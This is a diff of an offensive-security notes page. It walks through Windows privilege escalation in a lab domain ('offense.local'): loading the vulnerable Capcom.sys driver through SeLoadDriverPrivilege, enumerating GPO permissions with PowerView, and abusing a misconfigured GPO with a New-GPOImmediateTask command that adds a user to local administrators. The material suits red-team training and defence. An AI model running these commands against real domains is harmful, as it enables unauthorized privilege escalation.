@@ -111,22 +111,22 @@ int main()
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-We compile and launch the application and the privilege is now enabled:
+We compile the above, execute and the privilege `SeLoadDriverPrivilege` is now enabled:
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-17-22-45-54.png)
 
 ### Capcom.sys Driver Exploit
 
-To further prove the `SeLoadDriverPrivilege` is dangerous, let's see how we can easily exploit it.
+To further prove the `SeLoadDriverPrivilege` is dangerous, let's exploit it to elevate privileges.
 
-Let's build on the previous code and leverage the Win32 API call ntdll.NtLoadDriver\(\) to load our malicious kernel driver `Capcom.sys`. Note that lines 55 and 56 of the `privileges.cpp` are:
+Let's build on the previous code and leverage the Win32 API call `ntdll.NtLoadDriver()` to load the malicious kernel driver `Capcom.sys`. Note that lines 55 and 56 of the `privileges.cpp` are:
 
 ```cpp
 PCWSTR pPathSource = L"C:\\experiments\\privileges\\Capcom.sys";
 PCWSTR pPathSourceReg = L"\\registry\\machine\\System\\CurrentControlSet\\Services\\SomeService";
 ```
 
-The first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\) to execute the exploit:
+The first one declares a string variable indicating where the vulnerable Capcom.sys driver is located on the victim system and the second one is a string variable indicating a service name that will be used \(could be any service\) when executing the exploit:
 
 {% code-tabs %}
 {% code-tabs-item title="privileges.cpp" %}
@@ -243,7 +243,7 @@ Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others:
+The below indicates that the user `offense\spotless` has **WriteProperty**, **WriteDacl**, **WriteOwner** privileges among a couple of others that are ripe for abuse:
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-18-14-57-21.png)
 
@@ -265,15 +265,15 @@ Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityRefere
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-20-11-41-55.png)
 
-We can now resolve the computer names the GPO is applied to:
+We can now resolve the computer names the GPO `Misconfigured Policy` is applied to:
 
 ```csharp
 Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}
 ```
 
-![](../../.gitbook/assets/screenshot-from-2018-12-20-11-42-04.png)
+![ws01.offense.local has &quot;Misconfigured Policy&quot; applied to it](../../.gitbook/assets/screenshot-from-2018-12-20-11-42-04.png)
 
-One of the ways to abuse it and get code execution is to create an immediate task through the GPO like so:
+One of the ways to abuse this misconfiguration and get code execution is to create an immediate scheduled task through the GPO like so:
 
 ```csharp
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
@@ -287,17 +287,17 @@ The above will add our user spotless to the local `administrators` group of the 
 
 ### Force Policy Update
 
-ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user spotless now belongs to local administrators:
+ScheduledTask and its code will execute after the policy updates are pushed through \(roughly each 90 minutes\), but we can force it with `gpupdate /force` and see that our user `spotless` now belongs to local administrators group:
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-20-13-45-18.png)
 
 ### Under the hood
 
-If we observe the Scheduled Tasks for the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
+If we observe the Scheduled Tasks of the `Misconfigured Policy` GPO, we can see our `evilTask` sitting there:
 
 ![](../../.gitbook/assets/screenshot-from-2018-12-20-12-02-22.png)
 
-Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO `Misconfigured Policy`:
+Below is the XML file that got created by `New-GPOImmediateTask` that represents our evil scheduled task in the GPO:
 
 {% code-tabs %}
 {% code-tabs-item title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml" %}
@@ -364,7 +364,7 @@ Below is the XML file that got created by `New-GPOImmediateTask` that represents
 
 ### Users and Groups
 
-The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user spotless is added to the local administrators group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location:
+The same privilege escalation could be achieved by abusing the GPO Users and Groups feature. Note in the below file, line 6 where the user `spotless` is added to the local `administrators` group - we could change the user to something else, add another one or even add the user to another group/multiple groups since we can amend the policy configuration file in the shown location due to the GPO delegation assigned to our user `spotless`:
 
 {% code-tabs %}
 {% code-tabs-item title="\\\\offense.local\\SysVol\\offense.local\\Policies\\{DDC640FF-634A-4442-BC2E-C05EED132F0C}\\Machine\\Preferences\\Groups" %}
